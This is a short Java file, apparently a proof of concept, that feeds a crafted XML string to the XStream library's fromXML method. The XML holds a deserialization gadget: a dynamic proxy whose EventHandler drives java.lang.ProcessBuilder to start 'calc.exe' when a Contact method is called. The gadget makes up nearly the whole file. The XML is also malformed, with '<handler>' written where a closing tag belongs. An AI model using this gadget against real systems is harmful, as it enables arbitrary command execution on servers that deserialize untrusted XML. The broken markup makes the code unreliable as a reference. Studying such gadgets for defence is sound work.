import java.io.File;
import java.io.IOException;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.StaxDriver;

import contact.Contact;

public class Main {
  public static void main(String[] args) throws IOException {
    // File file = new File("test.txt");
    // file.createNewFile();
    String xml = "<contact>\n"
    + "<dynamic-proxy>\n" 
      + "<interface>Contact</interface>"
        + "<handler class='java.beans.EventHandler'>"
          + "<target class='java.lang.ProcessBuilder'>"
            + "<command><string>calc.exe</string></command>" 
          + "</target>"
          + "<action>start</action>" 
        + "<handler>" 
      + "</dynamic-proxy>" 
    + "</contact>";

    XStream xstream = new XStream();
    Contact c = (Contact)xstream.fromXML(xml);
    String fullName = c.getFullname();
    // xstream.fromXML("{'void':null}");
    // String xml = xstream.toXML(person);
    // // System.out.println(xml);
    // xstream.alias("person", Person.class);
  }
}